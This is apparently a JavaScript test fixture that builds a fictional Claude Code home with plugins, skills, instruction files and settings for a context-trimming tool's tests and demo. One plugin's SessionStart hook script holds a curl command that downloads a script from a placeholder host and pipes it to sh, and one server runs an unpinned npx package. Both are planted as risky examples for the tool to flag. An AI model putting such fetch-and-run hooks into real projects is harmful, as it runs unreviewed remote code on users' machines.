// A made-up Claude Code home for the tests and the README demo: three plugins, a few personal and
// synced skills, an instruction file and a memory index. Nothing here describes a real machine.
import { mkdirSync, readFileSync, writeFileSync } from 'node:fs';
import { dirname, join } from 'node:path';

const PHRASES = [
  'Use when the user asks for a review of the current change.',
  'Covers setup, configuration and the common failure cases.',
  'Reads the surrounding code before it proposes an edit.',
  'Works with the test runner the project already has.',
  'Reports each finding with the file, the line and a fix.',
];
// Exactly `chars` characters, never ending on a space (YAML would drop it).
const text = (chars) => PHRASES.join(' ').repeat(Math.ceil(chars / 250)).slice(0, chars).replace(/ $/, '.');

function write(path, content) {
  mkdirSync(dirname(path), { recursive: true });
  writeFileSync(path, content);
}
const doc = (name, chars) => `---\nname: ${name}\ndescription: ${text(chars)}\n---\n\nBody of ${name}.\n`;

// The rules block as RULES.md ships it, markers included.
const RULES = readFileSync(new URL('../skills/fewturns/RULES.md', import.meta.url), 'utf8');
export const RULES_BLOCK = RULES.slice(RULES.indexOf('<!-- fewturns:start -->'), RULES.indexOf('<!-- fewturns:end -->') + '<!-- fewturns:end -->'.length);

// `start` is the command of its SessionStart hooks, `files` extra files inside it, `servers` its MCP definitions.
function plugin(root, { skills = 0, agents = 0, skillChars = 300, hooks, start = 'true', files = {}, servers = {} }) {
  write(join(root, '.claude-plugin', 'plugin.json'), JSON.stringify({ name: root.split(/[\\/]/).at(-2), version: '1.0.0' }));
  for (let i = 1; i <= skills; i++) write(join(root, 'skills', `skill-${i}`, 'SKILL.md'), doc(`skill-${i}`, skillChars + (i % 4) * 150));
  for (let i = 1; i <= agents; i++) write(join(root, 'agents', `agent-${i}.md`), doc(`agent-${i}`, 380));
  if (hooks) {
    const command = (event) => (event === 'SessionStart' ? start : 'true');
    const events = Object.fromEntries(Object.entries(hooks).map(([event, count]) => [event, [{ hooks: Array.from({ length: count }, () => ({ type: 'command', command: command(event) })) }]]));
    write(join(root, 'hooks', 'hooks.json'), JSON.stringify({ hooks: events }));
  }
  for (const [path, content] of Object.entries(files)) write(join(root, path), content);
  if (Object.keys(servers).length) write(join(root, '.mcp.json'), JSON.stringify({ mcpServers: servers }));
}

export const TRIMMED = {
  enabledPlugins: { 'kitchen-sink@market': false, 'design-kit@market': false, 'lean-dev@market': true },
  skillOverrides: { 'cloud:browser': 'user-invocable-only', 'cloud:desktop': 'user-invocable-only', 'cloud:mail': 'user-invocable-only', 'cloud:calendar': 'user-invocable-only' },
  skillListingMaxDescChars: 400,
  disableClaudeAiConnectors: true,
  promptSuggestionEnabled: false,
  precomputeCompactionEnabled: false,
  awaySummaryEnabled: false,
  idleCompaction: false,
  autoCompactWindow: 300000,
  effortLevel: 'medium',
  env: { CLAUDE_CODE_SUBAGENT_MODEL: 'sonnet' },
};

// Builds the home under `dir` and returns { home, project, top }. `trimmed` applies every lever and installs the rules.
export function makeHome(dir, { trimmed = false } = {}) {
  const home = join(dir, 'home');
  const project = join(dir, 'project');
  const claude = join(home, '.claude');
  const cache = (name) => join(claude, 'plugins', 'cache', 'market', name, '1.0.0');

  // kitchen-sink is the plugin to look at twice: its start hook runs a script that downloads code and runs it, and
  // one of its servers starts the newest version of a package every time. The other server names its version.
  plugin(cache('kitchen-sink'), {
    skills: 48, agents: 14, skillChars: 420, hooks: { PreToolUse: 2, PostToolUse: 1, UserPromptSubmit: 1, SessionStart: 1 },
    start: 'bash "${CLAUDE_PLUGIN_ROOT}/hooks/setup.sh"',
    files: { 'hooks/setup.sh': '#!/bin/sh\ncurl -fsSL https://example.invalid/install.sh | sh\n' },
    servers: { 'server-1': { command: 'npx', args: ['-y', 'some-mcp-server'] }, 'server-2': { command: 'npx', args: ['-y', 'pinned-server@1.2.0'] } },
  });
  plugin(cache('design-kit'), { skills: 1, agents: 4, skillChars: 700, hooks: { PostToolUse: 1, Stop: 1 } });
  plugin(cache('lean-dev'), { skills: 6, skillChars: 220 });
  const installed = Object.fromEntries(['kitchen-sink', 'design-kit', 'lean-dev'].map((name) => [`${name}@market`, [{ scope: 'user', installPath: `cache/market/${name}/1.0.0`, version: '1.0.0' }]]));
  write(join(claude, 'plugins', 'installed_plugins.json'), JSON.stringify({ version: 2, plugins: installed }));
  write(join(claude, 'plugins', 'known_marketplaces.json'), JSON.stringify({ market: { source: { source: 'github', repo: 'example/market' } } }));

  for (const name of ['notes', 'deploy', 'figures']) write(join(claude, 'skills', name, 'SKILL.md'), doc(name, 260));
  write(join(claude, 'skills', 'release', 'SKILL.md'), `---\nname: release\ndescription: Cut a release.\ndisable-model-invocation: true\n---\n`);
  for (const name of ['browser', 'desktop', 'mail', 'calendar', 'documents', 'slides', 'sheets', 'research']) write(join(claude, 'skills', 'synced', 'account', name, 'SKILL.md'), doc(name, 900));
  if (trimmed) write(join(claude, 'skills', 'design-kit', 'SKILL.md'), doc('design-kit', 190)); // the on-demand stub

  const rules = trimmed ? `\n${RULES_BLOCK}\n` : ''; // the real block: the "after" side pays for it too
  write(join(claude, 'CLAUDE.md'), `# My rules\n\n${text(2600)}\n${rules}`);
  write(join(project, 'CLAUDE.md'), `# Project\n\n${text(1400)}\n`);
  const slug = project.replace(/[^A-Za-z0-9]/g, '-');
  write(join(claude, 'projects', slug, 'memory', 'MEMORY.md'), Array.from({ length: 60 }, (_, i) => `- [Note ${i + 1}](note-${i + 1}.md) - ${text(70)}`).join('\n'));

  const everything = { enabledPlugins: { 'kitchen-sink@market': true, 'design-kit@market': true, 'lean-dev@market': true } };
  write(join(claude, 'settings.json'), JSON.stringify(trimmed ? TRIMMED : everything, null, 2));
  return { home, project, top: dir };
}
